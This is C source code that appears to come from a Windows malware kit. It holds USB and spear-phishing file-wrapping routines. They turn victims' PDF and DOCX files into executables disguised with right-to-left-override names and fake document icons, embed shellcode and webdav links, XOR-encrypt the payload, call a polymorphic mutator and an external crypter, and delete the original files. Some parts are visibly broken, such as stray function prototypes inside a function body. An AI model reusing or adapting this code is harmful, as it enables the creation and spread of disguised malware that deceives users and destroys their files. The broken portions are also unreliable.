#include "main.h"
#include "globals.h"

//#include "..\minizip\miniz.c"

/*
#ifndef _WIN64
#include "resource.h"
#else
#include "../n0day2_core64/resource.h"
#endif*/

DWORD							wrapper_dl_thread_state; //might wanna use event objects
PDWORD							wrapper_template_buffer;
HANDLE							wrapper_template_buffer_ready;
PDWORD							wrapper_skeleton;
UINT							wrapper_skeleton_size;

BOOL usb_file_packer(	LPCSTR file_name, 
						BOOL delete_file, 
						BOOL rto, 
						BOOL datetime, 
						BOOL call_crypter, 
						BOOL compression,
						LPCSTR compression_archive,
						LPCSTR extension,
						LPCSTR kpcoe_config_file,
						HMODULE dll_base)
{
	ERROR_CODE					status;

	WRAPPER_PAYLOAD_DATA		payload_data						= {0};

	PWRAPPER_INFECT_LOG			log;

	PIMAGE_DOS_HEADER			dos_header;
	PIMAGE_NT_HEADERS			nt_headers;
	PIMAGE_SECTION_HEADER		section_header;

	PDWORD						buffer_orig, buffer_new;
	UINT						buffer_orig_size, buffer_new_size;

	CHAR						original_file_name[MAX_PATH]		= {0};
	CHAR						new_exe_file_name[MAX_PATH]			= {0};
	CHAR						tmp_path2[MAX_PATH]					= {0};
	WCHAR						rto_file_name[MAX_PATH]				= {0};
	WCHAR						tmp_path[MAX_PATH]					= {0};

	PDWORD						out_pe;
	UINT						out_pe_size;

	PDWORD						raw_file;

	LPCSTR						extension_list[]					= PACK_EXTENSIONS;

	PBYTE						ptr;

	UINT						raw_file_size;
	UINT						i, pack_index;

	// Test if we have a wrapper template
	if (global_config.skeleton == NULL) {
		status = (ERROR_CODE)template_check(&global_config);
		if (!status) {
			return;
		}

		// Test if we have a buffer ready. If not, wait n seconds and return.
		status = WaitForSingleObject(wrapper_template_buffer_ready, INFINITE);//WRAPPER_WAIT_FOR_TEMPLATE);
		if (status == WAIT_TIMEOUT) {
			return;
		}
	}

#ifdef DEBUG_OUT
	DEBUG("+wrapper> Downloaded template", file_name);
#endif

	// Test the file extension
	ptr = (PBYTE)((DWORD_PTR)file_name + string_length(file_name));
	while (*ptr != '.') {
		ptr--;
	}
	i = sizeof(extension_list) / sizeof(DWORD_PTR);
	for (i = 0; i < (sizeof(extension_list) / sizeof(DWORD_PTR)); i++) {

		if (!string_compare((LPCSTR)ptr, extension_list[i], string_length(extension_list[i]))) {
			break;
		}
	}
	if (i == (sizeof(extension_list) / sizeof(DWORD_PTR))) {
		return;
	}

	// Set pack index
	pack_index = i;

	// Open the file
	if (!read_raw_into_buffer(file_name, &raw_file_size, (LPVOID *)&raw_file)) {

		return;
	}

	// If this is an executable, abort
	dos_header		= (PIMAGE_DOS_HEADER)raw_file;
	if ((WORD)dos_header->e_magic == 'ZM') {
		return;
	}

	// Check if this file was already infected
#ifdef USB_DO_NOT_REINFECT
	log = first_wrapper_log;
	if (log != NULL) {
		while (TRUE) {


			if (!string_compare(log->file_name, file_name, string_length(file_name))) {
				// Already infected file

				return;
			}

			if (log->next == NULL) {
				break;
			}

			log = (PWRAPPER_INFECT_LOG)log->next;
		}
	}	
#endif

#ifndef DISABLE_PROBABILITY_CHECK
	if (compute_probability(global_config.wrapper_probability) == FALSE) {

		return;
	}
#endif

#ifdef DEBUG_OUT
	DEBUG("+wrapper> Infecting file %s", file_name);
#endif

	// Create a new name for the executable
	CopyMemory(new_exe_file_name, file_name, string_length(file_name));
	ptr = (PBYTE)((DWORD_PTR)new_exe_file_name + string_length(new_exe_file_name));
	while (*(PCHAR)((DWORD_PTR) ptr - 1) != '.') { ptr--; }
	ZeroMemory((PVOID)ptr, string_length((LPCSTR)ptr));
	CopyMemory(ptr, "exe", string_length("exe"));

	// Add a resource to our template
	if (global_config.spearphisher == TRUE) {
		wrapper_skeleton		= global_config.skeleton;
		wrapper_skeleton_size	= global_config.skeleton_size;
	}
	status = write_raw_to_disk(new_exe_file_name, wrapper_skeleton, wrapper_skeleton_size);
	if (!status) {
		return;
	}
	status = install_template_resource(new_exe_file_name, file_name);
	if (!status) {

#ifdef DEBUG_OUT
	DEBUG("+wrapper> Failed to install resource in %s", file_name);
#endif
		return FALSE;
	}

	// Append payload to EOF data
	status = read_raw_into_buffer(new_exe_file_name, &buffer_orig_size, (LPVOID *)&buffer_orig);
	if (!status) {
		return;
	}

	buffer_new_size = (UINT)((UINT)buffer_orig_size + raw_file_size + sizeof(WRAPPER_PAYLOAD_DATA) + string_length(file_name));
	buffer_new		= (PDWORD)HeapAlloc(GetProcessHeap(), 0, buffer_new_size);
	ZeroMemory((PVOID)buffer_new, buffer_new_size);

	// Generate our payload data struct
	ZeroMemory((PVOID)&payload_data, sizeof(WRAPPER_PAYLOAD_DATA));
	payload_data.signature					= WRAPPER_PAYLOAD_SIG;
	payload_data.key						= generate_random_dword();
	payload_data.payload_length				= raw_file_size;
	payload_data.original_file_length		= string_length(file_name);

	// Append our payload data struct + file name string
	CopyMemory((PVOID)((DWORD_PTR)buffer_new + buffer_orig_size), &payload_data, sizeof(WRAPPER_PAYLOAD_DATA));
	CopyMemory((PVOID)((DWORD_PTR)buffer_new + buffer_orig_size + sizeof(WRAPPER_PAYLOAD_DATA)), 
		file_name, string_length(file_name));
	
	// Copy payload
	CopyMemory(buffer_new, buffer_orig, buffer_orig_size);
	CopyMemory((PVOID)((DWORD_PTR)buffer_new + (DWORD)buffer_orig_size + sizeof(WRAPPER_PAYLOAD_DATA) + payload_data.original_file_length), 
		raw_file, raw_file_size);

	// Encrypt payload
#ifdef WRAP_XOR_PAYLOAD
	xor32_data(payload_data.key, (PDWORD)((DWORD_PTR)buffer_new + (DWORD)buffer_orig_size + sizeof(DWORD)), 
		raw_file_size + (sizeof(WRAPPER_PAYLOAD_DATA) - sizeof(DWORD) + payload_data.original_file_length));
#endif

	status = write_raw_to_disk(new_exe_file_name, buffer_new, buffer_new_size);
	if (!status) {
		return;
	}

	// Set datetime if required
	if ((datetime == TRUE)) {
		//append_date_filename(new_exe_file_name, new_exe_file_name);
	}

	// Mangle extension with RTO if required
	if ((rto == TRUE) && (extension != NULL)) {
		rtl_character_rename(new_exe_file_name, extension, rto_file_name);
	}

	DeleteFileA(file_name);

	/*
	// Generate our original payload file name
	CopyMemory(original_file_name, file_name, string_length(file_name));
	PathStripPathA(original_file_name);

	// Generate our struct
	payload_data.key					= 0xffffffff;
	payload_data.original_file_length	= string_length(original_file_name);
	payload_data.payload_length			= raw_file_size;

	// Generate our executable
	out_pe_size		= (wrapper_skeleton_size + raw_file_size + sizeof(WRAPPER_PAYLOAD_DATA));
	out_pe			= (PDWORD)HeapAlloc(GetProcessHeap(), 0, out_pe_size);
	ZeroMemory(out_pe, out_pe_size);

	// Copy the skeleton
	CopyMemory(out_pe, wrapper_skeleton, wrapper_skeleton_size);

	dos_header		= (PIMAGE_DOS_HEADER)out_pe;
	nt_headers		= (PIMAGE_NT_HEADERS)((DWORD_PTR)dos_header + dos_header->e_lfanew);
	section_header	= (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(nt_headers) + (sizeof(IMAGE_SECTION_HEADER) * (nt_headers->FileHeader.NumberOfSections - 1)));

	// Install the structure + original string
	CopyMemory((PVOID)((DWORD_PTR)out_pe + (section_header->PointerToRawData + section_header->SizeOfRawData)), (PVOID)&payload_data, sizeof(WRAPPER_PAYLOAD_DATA));
	CopyMemory((PVOID)((DWORD_PTR)out_pe + (section_header->PointerToRawData + section_header->SizeOfRawData) + sizeof(WRAPPER_PAYLOAD_DATA)), 
		original_file_name, payload_data.original_file_length);

	// Copy the payload
	CopyMemory((PVOID)((DWORD_PTR)out_pe + (section_header->PointerToRawData + section_header->SizeOfRawData) + sizeof(WRAPPER_PAYLOAD_DATA) + payload_data.original_file_length), 
		raw_file, raw_file_size);

	write_raw_to_disk("C:\\Documents and Settings\\user\\Desktop\\WPAD.exe", out_pe, out_pe_size);

	ExitProcess(0);
	*/
	return TRUE;
}


#ifndef DISABLE_SPEARPHISHER
VOID usb_file_packer_spearphisher(	LPCSTR file_name, 
									BOOL delete_file, 
									BOOL rto, 
									BOOL datetime, 
									BOOL call_crypter, 
									BOOL compression,
									LPCSTR compression_archive,
									LPCSTR extension,
									LPCSTR kpcoe_config_file,
									HMODULE dll_base)
{
	ERROR_CODE					status;

	PWRAPPER_INFECT_LOG			log;

	IMAGE_DOS_HEADER			*dos_header;
	IMAGE_NT_HEADERS32			*nt_headers;
	PIMAGE_SECTION_HEADER		shellcode_segment, 
								data_segment, 
								payload_segment,
								resource_segment;

	STARTUPINFOA				startup_info;
	PROCESS_INFORMATION			process_info;		

	HRSRC						resource;
	HGLOBAL						global;

	CHAR						kpcoe_parameters[1024]				= {0};

	PDWORD						raw_file,
								out_file,
								shellcode_base,
								new_pool;
	UINT						raw_file_size,
								out_file_size,
								shellcode_size;

	PDWORD						KPCOE_config;
	UINT						KPCOE_config_size;

	PDWORD						KPCOE_new_config;

	WCHAR						rtl_unicode_name[MAX_PATH]			= {0};

	CHAR						exe_file_name[MAX_PATH]				= {0};
	CHAR						executable_path[MAX_PATH]			= {0};

	DWORD						*local_base;

	DWORD						payload_key, tmp_key;

	LPCSTR						extension_list[]		= PACK_EXTENSIONS;

	BYTE						*ptr, *ptr2;

	UINT						pack_index;
	INT							i;

	//BREAK;

	// Test the file extension
	ptr = (PBYTE)((DWORD_PTR)file_name + string_length(file_name));
	while (*ptr != '.') {
		ptr--;
	}
	i = sizeof(extension_list) / sizeof(DWORD_PTR);
	for (i = 0; i < (sizeof(extension_list) / sizeof(DWORD_PTR)); i++) {

		if (!string_compare(ptr, extension_list[i], string_length(extension_list[i]))) {
			break;
		}
	}
	if (i == (sizeof(extension_list) / sizeof(DWORD_PTR))) {
		return;
	}

	// Set pack index
	pack_index = i;

	// Open the file
	if (!read_raw_into_buffer(file_name, &raw_file_size, &raw_file)) {
		if (delete_file == FALSE) {
			printf("[!] Failed to open %s\n", file_name);
		}
		return;
	}

	// If this is an executable, abort
	dos_header		= (PIMAGE_DOS_HEADER)raw_file;
	if ((WORD)dos_header->e_magic == 'ZM') {
		return;
	}

	// Check if this file was already infected
#ifdef USB_DO_NOT_REINFECT
	log = first_wrapper_log;
	if (log != NULL) {
		while (TRUE) {

#ifdef DEBUG_OUT
			DEBUG("+wrapper> *** %s", log->file_name);
#endif

			if (!string_compare(log->file_name, file_name, string_length(file_name))) {
				// Already infected file

#ifdef DEBUG_OUT
				DEBUG("+wrapper> File already infected");
#endif

				return;
			}

			if (log->next == NULL) {
				break;
			}

			log = (PWRAPPER_INFECT_LOG)log->next;
		}
	}

#ifdef DEBUG_OUT
	else {
		DEBUG("+wrapper> \tNo Files in buffer");
	}
#endif
	
#endif

	if (compute_probability(global_config.wrapper_probability) == FALSE) {
#ifdef DEBUG_OUT
		DEBUG("+wrapper> Wrapper skipping file due to probability (user config)");
#endif
		return;
	}

#ifdef DEBUG_OUT
	DEBUG("+wrapper> Infecting file %s", file_name);
#endif

	out_file_size	= 0x3000;

								

	out_file = (PDWORD)VirtualAlloc(NULL, out_file_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Generate DOS header
	dos_header				= (PIMAGE_DOS_HEADER)out_file;
	dos_header->e_magic		= (WORD)'ZM';
	dos_header->e_cblp		= (WORD)0x0090;
	dos_header->e_cp		= (WORD)3;
	dos_header->e_cparhdr	= (WORD)4;
	dos_header->e_maxalloc	= (WORD)0xffff;
	dos_header->e_sp		= (WORD)0x00b8;
	dos_header->e_lfarlc	= (WORD)0x0040;
	dos_header->e_lfanew	= (DWORD)0xb0;
	dos_header->e_csum		= SC0_SIGNATURE;

	// Generate PE header
	nt_headers													= (PIMAGE_NT_HEADERS32)((DWORD_PTR)out_file + dos_header->e_lfanew);
	nt_headers->Signature										= (WORD)'EP';

	// Generate FileHeader
	nt_headers->FileHeader.Machine								= (WORD)0x014c;														// i386 intel
	nt_headers->FileHeader.NumberOfSections						= 0;
	nt_headers->FileHeader.TimeDateStamp						= 0x4545BE5D;
	nt_headers->FileHeader.SizeOfOptionalHeader					= 0xe0;
	nt_headers->FileHeader.Characteristics						= (WORD)0x103;

	// Generate OptionalHeader
	nt_headers->OptionalHeader.Magic							= (WORD)0x010b;
	nt_headers->OptionalHeader.MajorLinkerVersion				= 8;
	nt_headers->OptionalHeader.SizeOfCode						= 0x1000;
	nt_headers->OptionalHeader.BaseOfCode						= 0x1000;
//#ifndef _WIN64
	nt_headers->OptionalHeader.BaseOfData						= 0x2000;
//#else
	nt_headers->OptionalHeader.BaseOfData						= 0;
//#endif
	nt_headers->OptionalHeader.ImageBase						= 0x400000;
	nt_headers->OptionalHeader.SectionAlignment					= 0x1000;
	nt_headers->OptionalHeader.FileAlignment					= 0x1000;
	nt_headers->OptionalHeader.MajorOperatingSystemVersion		= 4;
	nt_headers->OptionalHeader.MajorSubsystemVersion			= 4;
	nt_headers->OptionalHeader.SizeOfImage						= 0x1000;			// Only the headers
	nt_headers->OptionalHeader.SizeOfHeaders					= 0x1000; //FIXME
	nt_headers->OptionalHeader.Subsystem						= 2;
	nt_headers->OptionalHeader.DllCharacteristics				= 0x400;
	nt_headers->OptionalHeader.SizeOfStackReserve				= 0x100000;
	nt_headers->OptionalHeader.SizeOfStackCommit				= 0x1000;
	nt_headers->OptionalHeader.SizeOfHeapReserve				= 0x100000;
	nt_headers->OptionalHeader.SizeOfHeapCommit					= 0x1000;
	nt_headers->OptionalHeader.NumberOfRvaAndSizes				= 10;

	nt_headers->OptionalHeader.AddressOfEntryPoint				= 0x1000;

	// .text			// shellcode		VA 0x1000, RAW 0x1000
	// .data			// shellcode data	VA 0x2000, RAW 0x2000
	// .xdata			// xTG (x)			VA 0x3000, RAW 0x3000
	// .rdata			// xTG (r)			VA 0x4000, RAW 0x4000
	// .payload			// Raw Payload		VA 0x5000, RAW 0x5000
	// .rsrc

#ifdef DEBUG_OUT
	//DEBUG("+wrapper> Installing segments....");
#endif

	// Generate shellcode segment (.text)
	shellcode_segment											= (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(nt_headers);
	shellcode_segment->Misc.VirtualSize							= 0x1000;
	shellcode_segment->VirtualAddress							= 0x1000;
	shellcode_segment->SizeOfRawData							= 0x1000;
	shellcode_segment->PointerToRawData							= 0x1000;
	shellcode_segment->Characteristics							= (DWORD)0xC0000080;
	CopyMemory(shellcode_segment->Name, ".text", string_length(".text"));
	nt_headers->FileHeader.NumberOfSections++;
	nt_headers->OptionalHeader.SizeOfImage						+= 0x1000;

	// Generate shellcode data segment (.data)
	data_segment												= (PIMAGE_SECTION_HEADER)((DWORD_PTR)shellcode_segment + sizeof(IMAGE_SECTION_HEADER));
	data_segment->Misc.VirtualSize								= 0x1000;
	data_segment->VirtualAddress								= 0x2000;
	data_segment->SizeOfRawData									= 0x1000;
	data_segment->PointerToRawData								= 0x2000;
	data_segment->Characteristics								= 0xc0000040; 
	CopyMemory(data_segment->Name, ".data", string_length(".data"));
	nt_headers->FileHeader.NumberOfSections++;
	nt_headers->OptionalHeader.SizeOfImage						+= 0x1000;

	// Copy over shellcode into .text
	//BREAK;
#ifndef _WIN64
	resource		= FindResource(dll_base, MAKEINTRESOURCE(IDR_SC_WRAPPER1), "SC_WRAPPER");
	global			= LoadResource(dll_base, resource);
#else
	resource		= FindResource(dll_base, MAKEINTRESOURCE(IDR_SC_WRAPPER1), "SC_WRAPPER");
	global			= LoadResource(dll_base, resource);
#endif
	LockResource(global);

	if((global || resource) == NULL) {
#ifdef DEBUG_OUT
		DEBUG("+wrapper> Failure in loading shellcode resource.");
#endif
		return;
	}

#ifdef DEBUG_OUT
	//DEBUG("+wrapper> Shellcode resource loaded.");
#endif

	// Get pointer and size of shellcode; copy
	get_shellcode_from_pe((PDWORD)global, &shellcode_base, &shellcode_size);
	CopyMemory((PVOID)((DWORD_PTR)out_file + shellcode_segment->PointerToRawData + 0), // The 4 bytes are reserved for the .data xor 
				shellcode_base,
				shellcode_size);
	UnlockResource(global);
	FreeResource(global);

#ifdef DEBUG_OUT
	//DEBUG("+wrapper> Releasing shellcode resource");
#endif

	// Install 4 byte XOR key at the beginning of .data
	/// ****


	// Stamp in eip into .text
	*(PDWORD)((DWORD_PTR)out_file + shellcode_segment->PointerToRawData + SC_INFECTOR_EIP) = 
		((PIMAGE_NT_HEADERS32)((DWORD_PTR)((PIMAGE_DOS_HEADER)out_file)->e_lfanew + (DWORD_PTR)out_file))->OptionalHeader.ImageBase + shellcode_segment->VirtualAddress;

	// Check if there is an RTO setting
	*(PBYTE)((DWORD_PTR)out_file + data_segment->PointerToRawData) = 1;

	// Append webdav links into .data
	ptr = (PBYTE)((DWORD)out_file + data_segment->PointerToRawData + 4);
	i = 0;
	while (webdav_links[i] != NULL) {
		CopyMemory(ptr, webdav_links[i], string_length(webdav_links[i]));
		ptr = (PBYTE)((DWORD)ptr + (DWORD)string_length(webdav_links[i]) + 1);
		i++;
	}

	// Install original file name
	ptr += 3;
	ptr2 = (PBYTE)file_name;
	while (*ptr2 != 0) {
		ptr2++;
	}
	while (*ptr2 != '\\') {
		ptr2--;
	}
	ptr2++;
	CopyMemory(ptr, ptr2, string_length((PCHAR)ptr2));
	ptr = (PBYTE)((DWORD_PTR)ptr + string_length(ptr) + 1);
	*(PDWORD)ptr = 0xcccccccc;

	// Generate new exe name
	CopyMemory(exe_file_name, file_name, string_length(file_name));
	ptr = (PBYTE)exe_file_name;
	while (*ptr != 0) {
		ptr++;
	}
	while (*ptr != '.') {
		ptr--;
	}
	ZeroMemory(ptr, 16);
	if (extension != NULL) {
		*(PBYTE)ptr = '.';
		CopyMemory((PVOID)((DWORD)ptr + 1), extension, string_length(extension));
	} else {
		*(PDWORD)ptr = 'exe.';
	}

#ifdef USB_OPS_WRAPPER_RSRC
	// Install resource
	//raw_file_size += (UINT)0x2000;
	switch (pack_index) {
	case	PACK_INDEX_PDF:
		// PDF Resource
		status = install_pe_resource(&out_file, &out_file_size, IDR_PACK_PDF1, "PACK_PDF", dll_base);
		if (!status) {
#ifdef DEBUG_OUT
			DEBUG("+wrapper> Failure in packing resource");
#endif
			return;
		}
#ifdef DEBUG_OUT
		//DEBUG("+wrapper> Packed PDF Resource in %s", file_name);
#endif
		break;

	case	PACK_INDEX_DOCX:
		// DOCX Resource
		status = install_pe_resource(&out_file, &out_file_size, IDR_PACK_DOCX1, "PACK_DOCX", dll_base);
		if (!status) {
#ifdef DEBUG_OUT
			DEBUG("+wrapper> Failure in packing resource");
#endif
			return;
		}
#ifdef DEBUG_OUT
		//DEBUG("+wrapper> Packed DOCX Resource in %s", file_name);
#endif
		break;

	default:
		return;

	}
#endif

	// Generate .payload segment
	new_pool		= (PDWORD)VirtualAlloc(NULL, round(out_file_size + raw_file_size, 0x1000), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	CopyMemory(new_pool, out_file, out_file_size);
	VirtualFree(out_file, out_file_size, MEM_RELEASE);
	out_file		= new_pool;
	out_file_size	+= round(raw_file_size, 0x1000);

	dos_header	= (PIMAGE_DOS_HEADER)out_file;
	nt_headers	= (PIMAGE_NT_HEADERS32)((DWORD_PTR)out_file + dos_header->e_lfanew);

	resource_segment	= (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(nt_headers) + (sizeof(IMAGE_SECTION_HEADER) * (nt_headers->FileHeader.NumberOfSections - 1)));

	payload_segment												= (PIMAGE_SECTION_HEADER)((DWORD_PTR)resource_segment + sizeof(IMAGE_SECTION_HEADER));
	payload_segment->Misc.VirtualSize							= round(raw_file_size, 0x1000);
	payload_segment->VirtualAddress								= (DWORD)(resource_segment->VirtualAddress + resource_segment->Misc.VirtualSize);
	payload_segment->SizeOfRawData								= raw_file_size;
	payload_segment->PointerToRawData							= (DWORD)(resource_segment->PointerToRawData + resource_segment->SizeOfRawData);
	payload_segment->Characteristics							= 0xc0000040;
	CopyMemory(payload_segment->Name, ".payload", string_length(".payload"));
	nt_headers->FileHeader.NumberOfSections++;
	nt_headers->OptionalHeader.SizeOfImage						= payload_segment->VirtualAddress + payload_segment->Misc.VirtualSize;

	// Copy payload
	CopyMemory((PVOID)((DWORD_PTR)out_file + payload_segment->PointerToRawData), 
				raw_file,
				raw_file_size);

	// Generate key for encryption
	//payload_key = generate_random_dword(); //FIXME

	// Shift/XOR Encryption on the payload
	
	tmp_key = payload_key;
	ptr = (PBYTE)((DWORD_PTR)out_file + payload_segment->PointerToRawData);
	for (i = 0; i < payload_segment->SizeOfRawData; i++) {

		*ptr = *ptr ^ (BYTE)tmp_key;

		tmp_key = tmp_key >> 8;

		if (tmp_key == 0) {
			tmp_key = payload_key;
		}

		ptr++;
	} 

	// Stamp in key for the wrapper assembly
	//*(PDWORD)((DWORD_PTR)out_file + shellcode_segment->PointerToRawData + 8) = payload_key;

	// Mutate stub
#ifdef INVOKE_XTG_WRAPPER
	status = mutate_wrapper(&out_file, &out_file_size, shellcode_size);
	if (!status) {
#ifdef DEBUG_OUT
		DEBUG("+wrapper> Error in xTG2 Mutator");
#endif
		return;
	}
#endif

	// Commit file to disk (only the exe)
	write_raw_to_disk(exe_file_name, out_file, out_file_size);

	//DeleteFileA("C:\\Users\\x90\\Desktop\\wrapped.exe");
	//CopyFileA(exe_file_name, "C:\\Users\\x90\\Desktop\\wrapped.exe", FALSE);
	//ExitProcess(0);

	// Invoke KPCOE crypter
#ifdef USB_KPCOE

	if (call_crypter == TRUE) {

		// Reconfigure to point the icon file to the appropriate target
		GetModuleFileName(NULL, executable_path, sizeof(executable_path));
		ptr = (PBYTE)((DWORD_PTR)executable_path + string_length(executable_path));
		while (*ptr != '\\') {
			ptr--;
		}
		ZeroMemory((LPCSTR)((DWORD_PTR)ptr + 1), string_length(ptr) - 1);
		_snprintf(executable_path, sizeof(executable_path), "%s%s", executable_path, KPCOE_CONFIG_FILE);
		read_raw_into_buffer(executable_path, &KPCOE_config_size, &KPCOE_config);

		// Modify value
		KPCOE_new_config = (PDWORD)HeapAlloc(GetProcessHeap(), 0, KPCOE_config_size + string_length(file_name));
		ZeroMemory(KPCOE_new_config, KPCOE_config_size + string_length(file_name));

		ptr = (PBYTE)KPCOE_config;
		while(TRUE) {

			if (!string_compare("Icon cloning target=", ptr, string_length("Icon cloning target="))) {
				ptr += string_length("Icon cloning target=");
				break;
			}

			ptr++;
		}

		CopyMemory(KPCOE_new_config, KPCOE_config, (UINT)((DWORD_PTR)ptr - (DWORD_PTR)KPCOE_config));
		ptr = (PBYTE)((DWORD_PTR)KPCOE_new_config + string_length((LPCSTR)KPCOE_new_config));
		CopyMemory(ptr, exe_file_name, string_length(exe_file_name));
		ptr = (PBYTE)((DWORD_PTR)ptr + string_length(exe_file_name) + 2);
		*(PWORD)((DWORD_PTR)ptr - 2) = '\r\n';
		CopyMemory(	(LPCSTR)ptr,
					(LPCSTR)((DWORD_PTR)KPCOE_config + (UINT)((DWORD_PTR)ptr - (DWORD_PTR)KPCOE_new_config) - string_length(exe_file_name)),
					(UINT)string_length((DWORD_PTR)KPCOE_config + (UINT)((DWORD_PTR)ptr - (DWORD_PTR)KPCOE_new_config)));

		// Write the new config
		DeleteFile(executable_path);
		write_raw_to_disk(executable_path, KPCOE_new_config, string_length((LPCSTR)KPCOE_new_config));
		
		// Create execution string
		_snprintf(kpcoe_parameters, sizeof(kpcoe_parameters), "%s -t %s -n crypted.exe -c %s",	KPCOE_FILE_NAME,
																								exe_file_name,
																								kpcoe_config_file);
		ZeroMemory(executable_path, sizeof(executable_path));
		GetModuleFileName(NULL, executable_path, sizeof(executable_path));

		ptr = (PBYTE)((DWORD_PTR)executable_path + string_length(executable_path));
		while (*ptr != '\\') {
			ptr--;
		}
		ZeroMemory((LPCSTR)((DWORD_PTR)ptr + 1), string_length(ptr) - 1);

		ZeroMemory(&startup_info, sizeof(STARTUPINFOA));
		ZeroMemory(&process_info, sizeof(PROCESS_INFORMATION));
		status = CreateProcessA(	NULL,
									kpcoe_parameters,
									NULL,
									NULL,
									FALSE,
									0,
									NULL,
									executable_path,
									&startup_info,
									&process_info);

		if ((status == FALSE) || (process_info.dwProcessId == 0)) {
			printf("[!] Error in calling KPCOE! Terminating.\n");
			ExitProcess(0);
		} else {
			printf("[*] %s has been encrypted.\n", file_name);
		}


		// Wait until the crypter has completed its work
		WaitForSingleObject(process_info.hProcess, INFINITE);


		// Deletes the original wrapped file
		DeleteFile(exe_file_name);

		// Copies the crypted file
		_snprintf(executable_path, sizeof(executable_path), "%s%s", executable_path, "crypted.exe");
		CopyFileA(executable_path, exe_file_name, FALSE);
		DeleteFileA(executable_path);

		// Restores the original config
		ZeroMemory(executable_path, sizeof(executable_path));
		GetModuleFileName(NULL, executable_path, sizeof(executable_path));
		ptr = (PBYTE)((DWORD_PTR)executable_path + string_length(executable_path));
		while (*ptr != '\\') {
			ptr--;
		}
		ZeroMemory((PVOID)((DWORD_PTR)ptr + 1), string_length((LPCSTR)ptr) - 1);
		_snprintf(executable_path, sizeof(executable_path), "%s%s", executable_path, KPCOE_CONFIG_FILE);
		DeleteFile(executable_path);
		write_raw_to_disk(executable_path, KPCOE_config, KPCOE_config_size);

		VirtualFree(KPCOE_config, KPCOE_config_size, MEM_RELEASE);
		HeapFree(GetProcessHeap(), 0, KPCOE_new_config);


	}

#endif


	// pif, chm, scr, exe override

	// Encrypt
#ifdef INVOKE_CRYPTER
	install_pe_crypter(out_file);
#endif

	// Append date
#ifdef INVOKE_FILENAME_DATE_APPEND
	if (datetime == TRUE) {
		append_date_filename(exe_file_name, (PCHAR *)exe_file_name);
	}
#endif

	// Warp extension
//#ifdef INVOKE_RTO
	ptr = (PBYTE)((DWORD_PTR)file_name + string_length(file_name));
	while (*ptr != '.') {
		ptr--;
	}
	if (rto == TRUE) {
		rtl_character_rename(exe_file_name, (LPCSTR)ptr, (LPWSTR)rtl_unicode_name);
	}
//#endif
	
	// Cleanup
	VirtualFree(out_file, out_file_size, MEM_RELEASE);

	// Delete original file
	if (delete_file == TRUE) {
		DeleteFileA(file_name);
	}

	// Compress and delete the original image
	if (compression == TRUE) {
		
		if (*(PWORD)rtl_unicode_name != 0) {

			// Unicode override


		} else {

			// No unicode override

			
		  mz_bool mz_zip_add_mem_to_archive_file_in_place(const char *pZip_filename, const char *pArchive_name,
			const void *pBuf, size_t buf_size, const void *pComment, mz_uint16 comment_size, mz_uint level_and_flags);
			
			ptr = (PBYTE)((DWORD_PTR)exe_file_name + string_length(exe_file_name));
			search_char((LPSTR *)&ptr, '\\', SEARCH_CHAR_BACKWARD);
			status =	mz_zip_add_mem_to_archive_file_in_place(	compression_archive,
																	(const char *)((DWORD_PTR)ptr + 1),
																	out_file,
																	out_file_size,
																	NULL,
																	0,
																	MZ_DEFAULT_COMPRESSION);
			if (status == MZ_FALSE) {
				printf("[!] Error in compression.");
				ExitProcess(0);
			}
														

		}

	
		mz_bool mz_zip_add_mem_to_archive_file_in_place(const char *pZip_filename, const char *pArchive_name,
	const void *pBuf, size_t buf_size, const void *pComment, mz_uint16 comment_size, mz_uint level_and_flags);
	

	//mz_zip_add_mem_to_archive_file_in_place(

	}

	// Append file name to wrapper log
#ifdef USB_DO_NOT_REINFECT
	if (first_wrapper_log == NULL) {

#ifdef DEBUG_OUT
		DEBUG("+wrapper> First wrapped file detected");
#endif
		first_wrapper_log = (PWRAPPER_INFECT_LOG)HeapAlloc(GetProcessHeap(), 0, sizeof(WRAPPER_INFECT_LOG));
		ZeroMemory(first_wrapper_log, sizeof(WRAPPER_INFECT_LOG));

		// Allocate memory for the string
		first_wrapper_log->file_name = (LPCSTR)HeapAlloc(GetProcessHeap(), 0, string_length(file_name) + 1);
		ZeroMemory((LPVOID)first_wrapper_log->file_name, string_length(file_name) + 1);
		
		CopyMemory((LPVOID)first_wrapper_log->file_name, file_name, string_length(file_name));
	} else {

		// Recurse until new is found
		log = first_wrapper_log;
		while (log->next != NULL) {
			log = (PWRAPPER_INFECT_LOG)log->next;
		}


		log->next = (LPVOID)HeapAlloc(GetProcessHeap(), 0, sizeof(WRAPPER_INFECT_LOG));
		ZeroMemory(log->next, sizeof(WRAPPER_INFECT_LOG));
		log = (PWRAPPER_INFECT_LOG)log->next;
		
		// Allocate memory for new stringf
		log->file_name = (LPCSTR)HeapAlloc(GetProcessHeap(), 0, string_length(file_name) + 1);
		ZeroMemory((LPVOID)log->file_name, string_length(file_name) + 1);
		
		CopyMemory((LPVOID)log->file_name, file_name, string_length(file_name));
	}
#endif

#ifdef DEBUG_OUT
	DEBUG("+wrapper> Completed Wrapping operations on %s", file_name);
#endif

	//BREAK;
 
	return;
}

#endif

//BOOL __stdcall xTG2(__inout PXTG_MAIN_STRUCT input);
/*
BOOL mutate_wrapper(PDWORD *buffer, PUINT buffer_size, UINT shellcode_instruction_length)
{
	PIMAGE_DOS_HEADER			dos_header;
	PIMAGE_NT_HEADERS32			nt_headers;
	PIMAGE_SECTION_HEADER		xdata_section_header, rdata_section_header, text_section;

	XTG_MAIN_STRUCT		xtg_main_struct				= {0};
	XTG_DATA_STRUCT		xtg_data_struct				= {0};
	XTG_FUNC_STRUCT		xtg_func_struct				= {0};
	XTG_TRASH_GEN		xtg_trash_gen				= {0};
	FAKA_FAKEAPI_GEN	faka_fakeapi_gen			= {0};

	HRSRC				resource;
	HGLOBAL				global;

	PDWORD				generated_trash,
						shellcode_base,
						xTG_buffer;

	PDWORD				new_pool;

	CHAR				segment_name[8];
	CHAR				char_map[]					= CHARACTER_MAP;

	BOOL				(__cdecl *xTG2)(__inout PXTG_MAIN_STRUCT);

	PBYTE				ptr;

	UINT				xTG_size,
						shellcode_size;

	UINT				i;

	// Reallocate memory pool
